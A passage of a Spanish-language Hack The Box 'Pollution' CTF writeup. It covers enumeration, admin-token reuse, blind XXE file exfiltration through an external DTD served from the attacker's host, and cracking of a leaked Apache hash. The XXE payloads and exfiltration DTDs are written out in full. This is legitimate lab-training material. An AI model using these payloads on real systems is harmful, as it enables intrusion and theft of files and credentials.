+++
author = "Andrés Del Cerro"
title = "Hack The Box: Pollution Writeup | Hard"
date = "2024-09-13"
description = ""
tags = [
    "HackTheBox",
    "Pollution",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "VHost Fuzzing",
    "Subdomain Enumerations",
    "Information Disclosure",
    "Blind XXE",
    "XXE",
    "Data Exfiltration",
    "Hash Cracking",
    "Cracking",
    "PHP Code Analysis",
    "Modifying PHP Serialized Session",
    "Abusing PHP filter wrapper",
    "Abusing FastCGI PHP-FPM",
    "User Pivoting",
    "Port Forwarding",
    "Prototype Pollution"
]

+++

# Hack The Box: Pollution Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Pollution"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.228.126 --ulimit 5000 -g
10.129.228.126 -> [22,6379,80]
```

```console
$ nmap -p22,6379,80 -sCV 10.129.228.126 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 20:27 CEST
Nmap scan report for forum.collect.htb (10.129.228.126)
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:1d:5c:65:72:9b:c6:43:30:a5:2b:a0:f0:1a:d5:fc (RSA)
|   256 4f:79:56:c5:bf:20:f9:f1:4b:92:38:ed:ce:fa:ac:78 (ECDSA)
|_  256 df:47:55:4f:4a:d1:78:a8:9d:cd:f8:a0:2f:c0:fc:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Forums
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -sU -n -Pn --min-rate 5000 10.129.228.126 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 18:50 CEST
Nmap scan report for 10.129.228.126
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
539/udp   closed apertus-ldp
1053/udp  closed remote-as
1058/udp  closed nim
26254/udp closed unknown
49171/udp closed unknown
49350/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
```

## Redis Enumeration
No podemos enumerar Redis porque requiere autenticación.
```console
$ redis-cli -h collect.htb
collect.htb:6379> KEYS *
(error) NOAUTH Authentication required.
```
# HTTP Enumeration

`whatweb` nos reporta un correo electrónico en el cual podemos ver un dominio llamado `collect.htb`, lo añadimos al `/etc/hosts`
```console
$ whatweb http://10.129.228.126
http://10.129.228.126 [200 OK] Apache[2.4.54], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@collect.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.228.126], JQuery[2.1.0], Lightbox, Script, Title[Home]
```

El `whatweb` hacia el dominio encontrado no nos reporta nada diferente, por lo cual quizás no se está aplicando virtual hosting.
```console
$ whatweb http://collect.htb
http://collect.htb [200 OK] Apache[2.4.54], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@collect.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.228.126], JQuery[2.1.0], Lightbox, Script, Title[Home]
```

Así se ve el sitio web.
![Write-up Image](images/Screenshot_1.png)

Analizando el sitio web encontramos esto, quizás exista una API por detrás.
![Write-up Image](images/Screenshot_2.png)

También encontramos parte del equipo, por lo cual podemos hacernos una lista de usuarios que siempre es útil.
![Write-up Image](images/Screenshot_3.png)

```console
$ cat users.txt 
white cheese
snow mary
johnny egg
catherine phyu
shao lynn
emma honey
olivia sofie
```

Mas adelante si lo necesitamos crearemos variaciones de estos usuarios.

También encontramos un formulario de registro bajo `/register`
![Write-up Image](images/Screenshot_4.png)

Vemos que tampoco encontramos una funcionalidad adicional
![Write-up Image](images/Screenshot_5.png)

Fuzzeando este sitio con la cookie de sesión no encontré nada relevante.

## Enumerating Subdomains
Con `wfuzz` vamos a intentar descubrir subdominios.

```console
$ wfuzz --hh=26194 -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.collect.htb' http://collect.htb

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://collect.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                  
=====================================================================

000000023:   200        336 L    1220 W     14098 Ch    "forum"     
000002341:   401        14 L     54 W       469 Ch      "developers"
```

Encontramos el subdominio `forum.collect.htb`, y el subdominio `developers.collect.htb` los añadimos al `/etc/hosts`

## Enumerating `developers.collect.htb`
![Write-up Image](images/Screenshot_21.png)

No puedo hacer nada por ahora.

## Enumerating `forum.collect.htb`

Podemos ver una instancia de `MyBB`

> Is a free and open-source forum software developed by the MyBB Group. It is written in PHP, supports MariaDB, MySQL, PostgreSQL and SQLite as database systems and, in addition, has database failover support. 

![Write-up Image](images/Screenshot_6.png)

Podemos enumerar los usuarios del foro bajo `/memberlist.php`
![Write-up Image](images/Screenshot_7.png)

Actualizamos nuestra lista de usuarios.
```console
 cat users.txt 
white cheese
snow mary
johnny egg
catherine phyu
shao lynn
emma honey
olivia sofie
administrator_forum
john
victor
sysadmin
jeorge
jane
karldev
lyon
```

Encontramos una vulnerabilidad relevante pero necesitamos tener acceso al panel de administración.
https://www.exploit-db.com/exploits/51213

Enumerando el foro encontramos un post interesante.

Donde un usuario tiene un problema intentando iniciar sesión a la API y el sysadmin le pide las solicitudes.

Quizás podamos ver credenciales o algún tipo de token de autenticación.
![Write-up Image](images/Screenshot_8.png)


Podemos ver este archivo por consola.

Es un archivo xml.
![Write-up Image](images/Screenshot_9.png)

Lo guardamos a un archivo y con `batcat` podemos verlo de una forma mas cómoda y bonita.
```console
$ batcat proxy.xml
```

Analizando el fichero encontramos dos cosas interesantes.
Una petición a un servicio interno en el puerto 3000, así que sabemos que hay un servicio interno. Utiliza de credenciales `user:pass` por lo cual no creo que sean válidas.
![Write-up Image](images/Screenshot_10.png)

Y también encontramos una solicitud POST a `http://collect.htb/set/role/admin` donde se le está pasando un token..
![Write-up Image](images/Screenshot_11.png)

Podemos probar a hacer la misma solicitud tanto como está como utilizando formato JSON pero no obtenemos respuesta del servidor.
```console
$ curl -v -X POST http://collect.htb/set/role/admin -H "Content-Type: application/json" -d '{"token": "ddac62a28254561001277727cb397baf"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host collect.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.228.126
*   Trying 10.129.228.126:80...
* Connected to collect.htb (10.129.228.126) port 80
> POST /set/role/admin HTTP/1.1
> Host: collect.htb
> User-Agent: curl/8.9.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
> 
* upload completely sent off: 45 bytes
< HTTP/1.1 302 Found
< Date: Fri, 13 Sep 2024 15:26:45 GMT
< Server: Apache/2.4.54 (Debian)
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: PHPSESSID=9r7i8f7fdugj0kk1d6trp52sl6; path=/
< Location: /home
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host collect.htb left intact
```

```console
$ curl -v -X POST http://collect.htb/set/role/admin -H "Content-Type: application/x-www-form-urlencoded" -d "token=ddac62a28254561001277727cb397baf"  
Note: Unnecessary use of -X or --request, POST is already inferred.                                                                                           
* Host collect.htb:80 was resolved.                                                                                                                           
* IPv6: (none)                                                                                                                                                
* IPv4: 10.129.228.126                                                                                                                                        
*   Trying 10.129.228.126:80...                                                                                                                               
* Connected to collect.htb (10.129.228.126) port 80                                                                                                           
> POST /set/role/admin HTTP/1.1                                                                                                                               
> Host: collect.htb                                                                                                                                           
> User-Agent: curl/8.9.1                                                                                                                                      
> Accept: */*                                                                                                                                                 
> Content-Type: application/x-www-form-urlencoded                                                                                                             
> Content-Length: 38                                                                                                                                          
>                                                                                                                                                             
* upload completely sent off: 38 bytes                                                                                                                        
< HTTP/1.1 302 Found                                                                                                                                          
< Date: Fri, 13 Sep 2024 15:26:37 GMT                                                                                                                         
< Server: Apache/2.4.54 (Debian)                                                                                                                              
< Expires: Thu, 19 Nov 1981 08:52:00 GMT                                                                                                                      
< Cache-Control: no-store, no-cache, must-revalidate                                                                                                          
< Pragma: no-cache                                                                                                                                            
< Set-Cookie: PHPSESSID=eh6r24lquctpqilu7gr0sooomf; path=/                                                                                                    
< Location: /home                                                                                                                                             
< Content-Length: 0                                                                                                                                           
< Content-Type: text/html; charset=UTF-8                                                                                                                      
< 
* Connection #0 to host collect.htb left intact
```

Buscando la lógica podemos deducir que el endpoint `/set/role/admin` lo que hace es convertir en administrador un usuario utilizando el token, pero, ¿Qué usuario? la única forma de identificar el usuario es mediante el `PHPSESSID`

Entonces, si queremos convertir a nuestro usuario en administrador podemos intentar hacer la solicitud pero utilizando nuestro `PHPSESSID`
```console
$ curl -v -X POST http://collect.htb/set/role/admin -d token=ddac62a28254561001277727cb397baf --cookie "PHPSESSID=gi2c1krg228jkg5gpvv9pibog4"
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host collect.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.228.126
*   Trying 10.129.228.126:80...
* Connected to collect.htb (10.129.228.126) port 80
> POST /set/role/admin HTTP/1.1
> Host: collect.htb
> User-Agent: curl/8.9.1
> Accept: */*
> Cookie: PHPSESSID=gi2c1krg228jkg5gpvv9pibog4
> Content-Length: 38
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 38 bytes
< HTTP/1.1 302 Found
< Date: Fri, 13 Sep 2024 15:35:01 GMT
< Server: Apache/2.4.54 (Debian)
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: /admin
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host collect.htb left intact
```

Y vemos que ocurre un 302 redirect a `/admin`
![Write-up Image](images/Screenshot_13.png)

Ahora podemos acceder a este panel administrativo.

Vemos un formulario para registrar un usuario en la API.
![Write-up Image](images/Screenshot_14.png)

![Write-up Image](images/Screenshot_15.png)

## External XML Entity Injection
Si con `burpsuite` interceptamos la petición, vemos que la data se está tramitando en XML.
![Write-up Image](images/Screenshot_16.png)

Podemos probar a ver si se acontece un XXE.
![Write-up Image](images/Screenshot_17.png)

Vemos un error de sintaxis, esto es porque debemos de URL-Encodear el payload.

![Write-up Image](images/Screenshot_18.png)

Vemos que nos devuelve un Ok pero no nos reporta ninguna información.

Podemos probar varias técnicas y payloads.

Encontramos en PayloadAllTheThings un payload para un Blind XXE en la cual se utiliza una técnica para exfiltrar la data a un servidor web.
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

Si utilizamos este payload para comprobar si el blind XXE funciona vemos que el servidor nos devuelve un 200 OK.
![Write-up Image](images/Screenshot_19.png)

Y nos llega una solicitud.
```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 19:54:33] code 404, message File not found
10.129.228.126 - - [13/Sep/2024 19:54:33] "GET /x HTTP/1.1" 404 -
```

Esto significa que es vulnerable.

Podemos probar el payload en la sección **### XXE OOB with DTD and PHP filter**
```plain
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

Entonces creamos un DTD llamado `dtd.xml` en el cual vamos a intentar exfiltrar el archivo `index.php`. Si todo sale bien debería de llegarnos una solicitud en la cual se descarga el DTD y luego otra con el archivo codificado en base64.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.104:8081/dtd.xml?%data;'>">
```

Ahora enviamos este payload al servidor.
```plain
<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//10.10.14.104%3a8081/dtd.xml">%25sp%3b%25param1%3b]><r>%26exfil%3b</r>
```

Y vemos que nos llega algo. 
```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:05:06] "GET /dtd.xml HTTP/1.1" 200 -
10.129.228.126 - - [13/Sep/2024 20:05:06] "GET /dtd.xml?PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK HTTP/1.1" 200 -
```

Al decodificarlo vemos varios archivos interesantes.
```console
$ echo "PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK" | base64 -d
<?php

require '../bootstrap.php';

use app\classes\Routes;
use app\classes\Uri;


$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```

Pero primero necesito saber cual es la ruta de el sitio web por lo cual vamos a ver el fichero `/etc/apache2/sites-enabled/000-default.conf`

Modificamos el DTD.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.104:8081/dtd.xml?%data;'>">
```

Pero no recibimos nada.
```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:10:01] "GET /dtd.xml HTTP/1.1" 200 -
```

Siguiendo el estándar para los ficheros de configuración de Apache podemos probar a conseguir el archivo ``collect.htb.conf

```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:11:03] "GET /dtd.xml HTTP/1.1" 200 -
10.129.228.126 - - [13/Sep/2024 20:11:03] "GET /dtd.xml?PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJU2VydmVyTmFtZSBjb2xsZWN0Lmh0YgoJRG9jdW1lbnRSb290IC92YXIvd3d3L2NvbGxlY3QvcHVibGljCgoJIyBBdmFpbGFibGUgbG9nbGV2ZWxzOiB0cmFjZTgsIC4uLiwgdHJhY2UxLCBkZWJ1ZywgaW5mbywgbm90aWNlLCB3YXJuLAoJIyBlcnJvciwgY3JpdCwgYWxlcnQsIGVtZXJnLgoJIyBJdCBpcyBhbHNvIHBvc3NpYmxlIHRvIGNvbmZpZ3VyZSB0aGUgbG9nbGV2ZWwgZm9yIHBhcnRpY3VsYXIKCSMgbW9kdWxlcywgZS5nLgoJI0xvZ0xldmVsIGluZm8gc3NsOndhcm4KCglFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKCUN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCgoJIyBGb3IgbW9zdCBjb25maWd1cmF0aW9uIGZpbGVzIGZyb20gY29uZi1hdmFpbGFibGUvLCB3aGljaCBhcmUKCSMgZW5hYmxlZCBvciBkaXNhYmxlZCBhdCBhIGdsb2JhbCBsZXZlbCwgaXQgaXMgcG9zc2libGUgdG8KCSMgaW5jbHVkZSBhIGxpbmUgZm9yIG9ubHkgb25lIHBhcnRpY3VsYXIgdmlydHVhbCBob3N0LiBGb3IgZXhhbXBsZSB0aGUKCSMgZm9sbG93aW5nIGxpbmUgZW5hYmxlcyB0aGUgQ0dJIGNvbmZpZ3VyYXRpb24gZm9yIHRoaXMgaG9zdCBvbmx5CgkjIGFmdGVyIGl0IGhhcyBiZWVuIGdsb2JhbGx5IGRpc2FibGVkIHdpdGggImEyZGlzY29uZiIuCgkjSW5jbHVkZSBjb25mLWF2YWlsYWJsZS9zZXJ2ZS1jZ2ktYmluLmNvbmYKPC9WaXJ0dWFsSG9zdD4KCiMgdmltOiBzeW50YXg9YXBhY2hlIHRzPTQgc3c9NCBzdHM9NCBzciBub2V0Cg== HTTP/1.1" 200 -
```

Decodificando el fichero encontramos la ruta de la aplicación, `/var/www/collect/public`
![Write-up Image](images/Screenshot_20.png)

No conseguí ningún archivo interesante de los controladores.

Pero recordemos que bajo `developers.collect.htb` se requería autenticación y era HTTP-Basic, por lo cual el hash de la contraseña debe de guardarse en un fichero `.htpasswd` y este se especifica en el archivo de configuración..

Así que podemos probar a filtrar el archivo `/etc/apache2/sites-enabled/developers.collect.htb.conf`

```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:15:28] "GET /dtd.xml HTTP/1.1" 200 -
10.129.228.126 - - [13/Sep/2024 20:15:28] "GET /dtd.xml?PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gY29sbGVjdEBsb2NhbGhvc3QKCVNlcnZlck5hbWUgZGV2ZWxvcGVycy5jb2xsZWN0Lmh0YgoJRG9jdW1lbnRSb290IC92YXIvd3d3L2RldmVsb3BlcnMKCgkjIEF2YWlsYWJsZSBsb2dsZXZlbHM6IHRyYWNlOCwgLi4uLCB0cmFjZTEsIGRlYnVnLCBpbmZvLCBub3RpY2UsIHdhcm4sCgkjIGVycm9yLCBjcml0LCBhbGVydCwgZW1lcmcuCgkjIEl0IGlzIGFsc28gcG9zc2libGUgdG8gY29uZmlndXJlIHRoZSBsb2dsZXZlbCBmb3IgcGFydGljdWxhcgoJIyBtb2R1bGVzLCBlLmcuCgkjTG9nTGV2ZWwgaW5mbyBzc2w6d2FybgoKCTxEaXJlY3RvcnkgIi92YXIvd3d3L2RldmVsb3BlcnMiPgoJCUF1dGhUeXBlIEJhc2ljCgkJQXV0aE5hbWUgIlJlc3RyaWN0ZWQgQ29udGVudCIKCQlBdXRoVXNlckZpbGUgL3Zhci93d3cvZGV2ZWxvcGVycy8uaHRwYXNzd2QKCQlSZXF1aXJlIHZhbGlkLXVzZXIKCTwvRGlyZWN0b3J5PgoJCgoJRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCglDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAoKCSMgRm9yIG1vc3QgY29uZmlndXJhdGlvbiBmaWxlcyBmcm9tIGNvbmYtYXZhaWxhYmxlLywgd2hpY2ggYXJlCgkjIGVuYWJsZWQgb3IgZGlzYWJsZWQgYXQgYSBnbG9iYWwgbGV2ZWwsIGl0IGlzIHBvc3NpYmxlIHRvCgkjIGluY2x1ZGUgYSBsaW5lIGZvciBvbmx5IG9uZSBwYXJ0aWN1bGFyIHZpcnR1YWwgaG9zdC4gRm9yIGV4YW1wbGUgdGhlCgkjIGZvbGxvd2luZyBsaW5lIGVuYWJsZXMgdGhlIENHSSBjb25maWd1cmF0aW9uIGZvciB0aGlzIGhvc3Qgb25seQoJIyBhZnRlciBpdCBoYXMgYmVlbiBnbG9iYWxseSBkaXNhYmxlZCB3aXRoICJhMmRpc2NvbmYiLgoJI0luY2x1ZGUgY29uZi1hdmFpbGFibGUvc2VydmUtY2dpLWJpbi5jb25mCjwvVmlydHVhbEhvc3Q+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo= HTTP/1.1" 200 -
```

Y encontramos lo siguiente.
```xml
<Directory "/var/www/developers">
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /var/www/developers/.htpasswd
                Require valid-user
        </Directory>
```

Vamos a intentar filtrar el archivo `/var/www/developers/.htpasswd`

```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:16:17] "GET /dtd.xml HTTP/1.1" 200 -
10.129.228.126 - - [13/Sep/2024 20:16:17] "GET /dtd.xml?ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg== HTTP/1.1" 200 -
```

Y encontramos un hash.
```console
$ echo "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

## Cracking Apache Hash
Con `haschat` podemos intentar este hash.

Podemos encontrar el modo en el que debemos crackearlo según el formato.
![Write-up Image](images/Screenshot_22.png)

Y ahora podemos crackearlo.
```console
C:\Users\pc\Desktop\hashcat-6.2.6>.\hashcat.exe -a 0 -m 1600 .\hash.txt .\rockyou.txt
...
$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1:r0cket

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
Time.Started.....: Fri Sep 13 18:18:33 2024 (2 secs)
Time.Estimated...: Fri Sep 13 18:18:35 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   136.7 kH/s (18.93ms) @ Accel:4 Loops:125 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 221184/14344387 (1.54%)
Rejected.........: 0/221184 (0.00%)
Restore.Point....: 184320/14344387 (1.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#1....: joan07 -> froggy27
Hardware.Mon.#1..: Temp: 56c Fan: 35% Util: 11% Core:1533MHz Mem:2000MHz Bus:8
```

Vemos que la credencial es `r0cket`

## `developers.collect.htb`
Ahora que tenemos credenciales podemos iniciar sesión.
`developers_group:r0cket`

Y necesitamos una segunda autenticación.
![Write-up Image](images/Screenshot_23.png)

## XXE (again)
Después de probar la credencial con todos los archivos no conseguí iniciar sesión.

Así que vamos a intentar conseguir el `index.php` de este sitio web, quizás las credenciales están hardcodeadas.

Vamos a recuperar el archivo `/var/www/developers/login.php`

Y no podemos recuperarlo.
```console
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.126 - - [13/Sep/2024 20:23:20] "GET /dtd.xml HTTP/1.1" 200 -
```

Vamos a probar el `index.php` y este si que lo podemos recuperar.
```php
<?php                                                                                                                                                                                                                                         
require './bootstrap.php';                                                                                                                                                                                                                    
                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                              
if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {                                                                                                                                                                                 
    die(header('Location: /login.php'));                                                                                                                                                                                                      
}                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                              
if (!isset($_GET['page']) or empty($_GET['page'])) {                                                                                                                                                                                          
    die(header('Location: /?page=home'));                                                                                                                                                                                                     
}                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                              
$view = 1;                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                              
?>                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                              
<!DOCTYPE html>                                                                                                                                                                                                                               
<html lang="en">                                                                                                                                                                                                                              
                                                                                                                                                              
<head>                                                                                                                                                        
    <meta charset="UTF-8">                                                                                                                                    
